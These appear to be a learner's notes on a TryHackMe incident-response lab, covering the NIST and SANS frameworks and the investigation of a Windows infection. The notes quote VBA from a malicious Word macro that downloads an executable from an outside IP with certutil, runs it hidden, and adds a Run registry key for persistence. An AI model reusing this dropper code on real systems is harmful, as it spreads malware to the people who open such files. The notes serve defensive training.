Incident Response Process

[link](https://tryhackme.com/room/incidentresponseprocess)

`IR (incident response)` = processes and technologies to detect and react to cyber threats

### frameworks

#### NIST Incident Response Framework

`Preparation`: prepare capabilities for IR  
`Detection and analysis`: identify scope and impact of the incident  
`Containment, Eradication` and Recovery: contain, eliminate threat, restore operations  
`Post-Incident Activity`: review and improve IR process and documentation

#### SANS Incident Response 101

`SANS` = (Sysadmin, Audit, Network, and Security)

similar notion as NIST

preparation, identification, containment, eradication, recovery, and lessons learned


# Briefing (shortened from 3 paragraphs)
```
user reported slow laptop

IT found high CPU usage, suspected incident

SOC team verified no alert was rased on SIEM or EDR but found outbound connections from this PC's IP which bypassed firewall
```


# Detection and Analysis

### Task Manager

seemingly nothing here, but let's check background processes

`more details`

we see a weird named process taking 50% CPU (name: 32th4ckm3.exe)
`right click on it > select properties`

we can see it is in a temp folder - suspicious

remember its PID (1212) and go to Command Prompt

```bash
C:\Users\TryCleanUser>netstat -aofn | find "1212"
TCP 10.112.150.232:49689 45.33.32.156:42424 SYN_SENT 1212
```

we now know the IP and port of C2 server, which we should:
 - immediately block
 - analyse traffic to and fro in logs
 - put on a strictly monitored list (to see if malware is spreading)


#### But how did user get infected?

drive-by? phishing link?

let's think pragmatically and check their browser

found `invoice.docm` in downloads..

that means word with macros

### Open the downloaded file (in Word)

open it in word -> View -> Macros -> View macros -> Edit

we now see the AutoOpen macro (runs upon opening the document).

> overview of what the macro does will be explained in a bit

the most "eye catching" part of this VBA code is this part:

```VB
strURL = "http://172.234.25.65/3d33es454e.exe"
strFilePath = Environ("TEMP") & "\3d33es454e.exe"
```

that does NOT look good...

note: on an infected PC, do not expect luxuries.. word is not very stable and the computer is very slow

the code continues to exhibit malicious properties (right below the first snippet we have this):

```vb
strCmd = "cmd /c certutil -urlcache -split -f """ & strURL & """ """ & strFilePath & """"
    Shell strCmd, vbHide
    Wait (10)
    Shell strFilePath, vbHide
    
    strCmd = "cmd /c reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v DefaultApp /t REG_SZ /d """ & strFilePath & """ /f"
    Shell strCmd, vbHide
```

#### So what does the macro do?

in short...

**first snippet**
 - set variables from where to download the exe file from
 
**second snippet**
 - download the exe using certutil - executed in a hidden window (vbHide)
 - wait 10 seconds
 - execute the downloaded malware file in a hidden window
 - adds itself into Windows registry (HKCU\...\Run - this is where programs automatically executed on login are stored)

note: 
```
using certutil was quite stealthy, as it is a legitimate and trusted utility. Plus it is often allowed in security measures. Using such a pre-installed utility generates minimal noise and blends in well. 
```

#### **`TLDR`**
 - the user downloaded a file with macros
 - opened this file, executing the macro
 - the macro dowloads malware using certutil
 - malware "stealthy executes"
 - malware puts itself to the Run registry for persistence


### Containment, Eradication and Recovery

1) **kill the process**

-> `task manager -> right click on the process -> End task`

2) **delete any artefacts left by the malware** (mainly the registry entry it wrote)
 
-> `regedit` (Registry Editor app)

-> `paste the path of the Run key in the bar on top  
    ( *Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run* )

-> `find the entry for the malware, right click it and delete it`

### Conslusion

- develop a strong **incident response plan**
- EDR sulutions are very useful for detection of such incidents
- raise awareness of employees - never enough